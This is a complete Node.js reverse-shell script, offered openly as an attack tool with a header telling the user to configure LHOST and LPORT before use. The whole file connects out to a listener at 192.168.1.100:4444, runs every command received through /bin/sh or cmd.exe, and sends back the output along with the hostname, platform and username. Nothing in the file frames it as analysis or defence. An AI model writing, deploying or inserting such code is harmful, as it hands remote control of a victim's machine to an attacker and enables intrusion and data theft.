#!/usr/bin/env node
/**
 * Node.js Reverse Shell
 * Modern ES6+ implementation
 * Configure LHOST and LPORT before use
 */

const net = require('net');
const { spawn } = require('child_process');
const os = require('os');

const LHOST = '192.168.1.100';
const LPORT = 4444;

class ReverseShell {
    constructor(host, port) {
        this.host = host;
        this.port = port;
        this.client = null;
    }

    connect() {
        return new Promise((resolve, reject) => {
            this.client = new net.Socket();
            
            this.client.connect(this.port, this.host, () => {
                this.send(`Node.js Shell Connected! (${os.hostname()})\n`);
                resolve();
            });

            this.client.on('error', (err) => {
                reject(err);
            });

            this.client.on('close', () => {
                process.exit(0);
            });

            this.client.on('data', (data) => {
                this.handleCommand(data.toString().trim());
            });
        });
    }

    send(data) {
        if (this.client && !this.client.destroyed) {
            this.client.write(data + '\n');
        }
    }

    handleCommand(cmd) {
        if (cmd === 'exit' || cmd === 'quit') {
            this.send('Goodbye!');
            this.client.destroy();
            return;
        }

        if (cmd.startsWith('cd ')) {
            try {
                process.chdir(cmd.slice(3));
                this.send(`Changed to: ${process.cwd()}`);
            } catch (e) {
                this.send(`Error: ${e.message}`);
            }
            return;
        }

        if (cmd === 'info') {
            this.send(JSON.stringify({
                hostname: os.hostname(),
                platform: os.platform(),
                arch: os.arch(),
                user: os.userInfo().username,
                cwd: process.cwd()
            }, null, 2));
            return;
        }

        // Execute shell command
        const shell = process.platform === 'win32' ? 'cmd.exe' : '/bin/sh';
        const args = process.platform === 'win32' ? ['/c', cmd] : ['-c', cmd];

        const proc = spawn(shell, args);
        let output = '';

        proc.stdout.on('data', (data) => {
            output += data.toString();
        });

        proc.stderr.on('data', (data) => {
            output += data.toString();
        });

        proc.on('close', (code) => {
            if (output.length === 0) {
                this.send(`Command completed (code: ${code})`);
            } else {
                this.send(output);
            }
        });
    }

    run() {
        this.connect()
            .then(() => {
                console.log('Connected to ' + this.host + ':' + this.port);
            })
            .catch((err) => {
                console.error('Connection failed:', err.message);
                process.exit(1);
            });
    }
}

const shell = new ReverseShell(LHOST, LPORT);
shell.run();